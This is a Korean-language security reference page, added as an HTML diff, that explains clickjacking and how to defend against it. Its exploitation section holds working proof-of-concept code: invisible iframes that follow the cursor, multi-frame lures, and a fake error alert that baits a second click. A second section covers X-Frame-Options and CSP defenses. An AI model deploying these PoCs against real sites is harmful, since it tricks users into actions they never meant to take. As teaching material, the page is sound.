@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Click Jacking — PIXN</title>
+  <meta name="description" content="Click Jacking — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Click Jacking — PIXN"><meta property="og:description" content="Click Jacking — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Click Jacking</h1>
+      <time datetime="2021-10-26">OCTOBER 26, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>ClickJacking은 frame 등의 환경에서 User Interaction을 유도하여 사용자가 인지하지 못한 상태에서 중요 기능을 수행시키도록 하는 공격 기법을 의미합니다. 기본적으론 피싱과 같이 User Interaction이 필요하지만, Frame 내 포인틴, 투명 레이어 등 CSS 단 처리로 이를 쉽게 인지하지 못하도록 구성하여 상대적으로 성공 가능성이 높습니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>ClickJacking은 frame 기반의 공격이기 때문에 X-Frame-Options, CSP 등으로 보호받지 않는 페이지는 모두 영향을 받습니다. 다만 ClickJacking에는 이를 성공하기 위한 조건들(중요한 기능이 보호받지 못하는 경우 등)이 필요하기 때문에 아래 스텝으로 체크하는 방법이 편리합니다.</p>
+<ol>
+<li>서비스 내 중요기능 식별</li>
+<li>해당 기능의 User Interaction 체크</li>
+<li>X-Frame-Options, CSP 등으로 보호받지 않는 페이지인지 체크</li>
+</ol>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target_site&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>일반적으로 iframe을 통해 PoC 코드를 구성하곤 합니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target_site&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>이 때 iframe의 style에서 position, left, right, top, bottom, width, height 등을 이용하여 원하는 위치에 마우스 포인팅을 맞출 수 있습니다.</p>
+<pre><code>left:-91px;
+top:-320px;
+position:absolute;
+filter:alpha(opacity=0);
+z-index:1;
+opacity:0;
+overflow:hidden;
+width:1485px;
+height:836px;
+</code></pre>
+<p>다만 이를 직접 계산하기에는 좀 불편하기 때문에 보통 QuickJack 같은 도구를 이용하여 포인팅이 구성된 ClickJacking PoC를 만들 수 있습니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">style</span><span class="hljs-punctuation">&gt;</span><span class="hljs-name">body</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">margin</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-type">px</span><span class="hljs-punctuation">;</span><span class="hljs-keyword">padding</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-type">px</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">style</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;overflow:hidden;width:1px;height:1px;position:relative;&quot;</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">v</span><span class="hljs-punctuation">&gt;</span>
+    <span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;cksl7&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;cksl7&quot;</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://www.hahwul.com&quot;</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;border:0px;left:-108px;top:-357px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0;overflow:hidden;width:1281px;height:604px;&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span><span class="hljs-keyword">var</span> d<span class="hljs-operator">=</span><span class="hljs-built_in">document</span><span class="hljs-punctuation">;</span><span class="hljs-keyword">if</span><span class="hljs-punctuation">(</span><span class="hljs-operator">!</span>d<span class="hljs-punctuation">.</span>all<span class="hljs-punctuation">)</span>d<span class="hljs-punctuation">.</span>captureEvents<span class="hljs-punctuation">(</span>Event<span class="hljs-punctuation">.</span>MOUSEMOVE<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>d<span class="hljs-punctuation">.</span>onmousemove<span class="hljs-operator">=</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span>e<span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">var</span> i<span class="hljs-operator">=</span>d<span class="hljs-punctuation">.</span>getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;v&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>style<span class="hljs-punctuation">;</span>i<span class="hljs-punctuation">.</span>left<span class="hljs-operator">=</span>d<span class="hljs-punctuation">.</span>all<span class="hljs-operator">?</span>event<span class="hljs-punctuation">.</span>clientX<span class="hljs-operator">+</span>d<span class="hljs-punctuation">.</span>body<span class="hljs-punctuation">.</span>scrollLeft<span class="hljs-operator">:</span>e<span class="hljs-punctuation">.</span>pageX<span class="hljs-punctuation">;</span>i<span class="hljs-punctuation">.</span>top<span class="hljs-operator">=</span>d<span class="hljs-punctuation">.</span>all<span class="hljs-operator">?</span>event<span class="hljs-punctuation">.</span>clientY<span class="hljs-operator">+</span>d<span class="hljs-punctuation">.</span>body<span class="hljs-punctuation">.</span>scrollTop<span class="hljs-operator">:</span>e<span class="hljs-punctuation">.</span>pageY<span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;https://code.jquery.com/jquery-2.1.3.min.js&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>$<span class="hljs-punctuation">(</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">var</span> i<span class="hljs-operator">=</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-punctuation">;</span>$<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;#cksl7&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>hover<span class="hljs-punctuation">(</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>i<span class="hljs-operator">=</span>$<span class="hljs-punctuation">(</span><span class="hljs-keyword">this</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>closest<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;#v&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>attr<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;qjid&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>i<span class="hljs-operator">=</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>$<span class="hljs-punctuation">(</span><span class="hljs-built_in">window</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>focus<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>$<span class="hljs-punctuation">(</span><span class="hljs-built_in">window</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>blur<span class="hljs-punctuation">(</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;v&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>style<span class="hljs-punctuation">.</span>visibility<span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>$<span class="hljs-punctuation">(</span><span class="hljs-built_in">window</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>focus<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/170070917-8c84d9bc-15a2-4969-a472-f45653d04332.png" alt="" />
+<em>https://www.hahwul.com 내 Cullinan 버튼에 포인팅한 PoC</em></p>
+<h4 id="nstep-multiple-frame">NStep - Multiple frame</h4>
+<p>2 Step 이상의 Click Jacking을 위해선 여러 iframe과 적절하게 꾸밀 수 있는 CSS 트릭이 필요합니다. 여러 iframe을 각각 step에 맞는 페이지를 로드한 후 CSS로 위장한 페이지에서 클릭을 유도하면 됩니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">style</span><span class="hljs-punctuation">&gt;</span>
+	<span class="hljs-punctuation">.</span><span class="hljs-title class_">split</span><span class="hljs-punctuation">{</span>
+		<span class="hljs-keyword">width</span><span class="hljs-punctuation">:</span> <span class="hljs-number">50</span><span class="hljs-type">%</span><span class="hljs-punctuation">;</span>
+		<span class="hljs-keyword">height</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-type">%</span><span class="hljs-punctuation">;</span>
+	<span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">style</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;split&quot;</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target/step1.page&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;split&quot;</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target/step2.page&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/170068605-21a93f10-b201-4827-8a4f-2ef2d586b18d.png" alt="" /></p>
+<h4 id="nstep-event-handler">NStep - Event Handler</h4>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+	<span class="hljs-keyword">function</span> fire<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>
+		frm<span class="hljs-punctuation">.</span>src<span class="hljs-operator">=</span><span class="hljs-string">&quot;target/step2.page&quot;</span>
+		alert<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;실패하였습니다. 페이지를 한번 더 눌러주세요.&quot;</span><span class="hljs-punctuation">)</span>
+	<span class="hljs-punctuation">}</span>
+	frm<span class="hljs-punctuation">.</span>addEventListener<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;click&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span>event<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+		fire<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+	<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-literal">false</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">iframe</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;frm&quot;</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target/step1.page&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">iframe</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h3 id="bypass-protection">Bypass protection</h3>
+<h4 id="bypass-policy">Bypass policy</h4>
+<p>X-Frame-Options, CSP 등으로 보호받고 있다고 하더라도, 이 헤더들의 정책에 따라서 frame 허용이 가능한 경우가 발생할 수 있습니다. 정책을 잘 체크하고 허용된 도메인 등을 확인하여 공격 성공을 유도할 수 있습니다.</p>
+<h4 id="multiple-step-clickjacking">Multiple-Step ClickJacking</h4>
+<p>간혹 User Interaction이 고려된 중요 기능들이 있는 경우 단순 클릭으로 ClickJacking이 어려운 경우도 존재합니다. 다만 이후 액션들이 충분히 클릭, 텍스트 입력 등 유도가 가능한 케이스라면, ClickJacking의 코드단에서 게임과 같은 페이지를 구성하여 사용자의 액션을 유도할 수 있습니다.</p>
+<p>(실제로 해커원에서 주사위 게임 PoC가 있었습니다)</p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<h3 id="x-frame-options">X-Frame-Options</h3>
+<p>X-Frame-Options은 HTTP Response Header로 iframe, frame, object 태그를 이용한 렌더링에 대한 정책 헤더입니다. 이를 통해서 의도하지 않은 frame을 막을 수 있어 ClickJacking 공격에 효과적으로 대응할 수 있습니다.</p>
+<pre><code>X-Frame-Options: deny
+X-Frame-Options: sameorigin
+X-Frame-Options: allow-from https://example.com/
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Policy</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>deny</td>
+<td>어떠한 사이트에서도 frame 상에서 보여질 수 없습니다.</td>
+</tr>
+<tr>
+<td>sameorigin</td>
+<td>동일한 사이트(Same-Origin)의 frame에서만 보여집니다.</td>
+</tr>
+<tr>
+<td>allow-from <em>uri</em></td>
+<td>지정된 특정 uri의 frame 에서만 보여집니다.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="user-interaction">User Interaction</h3>
+<p>X-Frame-Options 헤더 적용이 어려운 경우, 중요 기능에 대해서 User Interaction을 추가하는 형태로 공격을 예방할 수 있습니다. 단순 클릭 등을 이용한 확인은 쉽게 우회할 수 있는 여지가 있기 때문에 Captcha와 같이 조금 더 강도가 있는 User Interaction 적용으로 통해 ClickJacking을 방어할 수 있습니다.</p>
+<h3 id="csp">CSP</h3>
+<p>CSP(Content-Secuirty-Policy) 헤더를 통해서도 방어할 수 있습니다. frame-ancestors를 통해 frame를 허용할 범위를 지정하여 무분별한 frame을 차단할 수 있습니다.</p>
+<pre><code>Content-Security-Policy: frame-ancestors 'self';
+Content-Security-Policy: frame-ancestors normal-website.com;
+</code></pre>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/samyk/quickjack">https://github.com/samyk/quickjack</a></li>
+<li><a href="https://www.zaproxy.org/docs/alerts/10020/">https://www.zaproxy.org/docs/alerts/10020/</a></li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li>https://www.hahwul.com/2017/07/07/web-hacking-easily-trigger-event/</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/clickjacking">https://portswigger.net/web-security/clickjacking</a></li>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Frame-Options</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/click-jacking/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
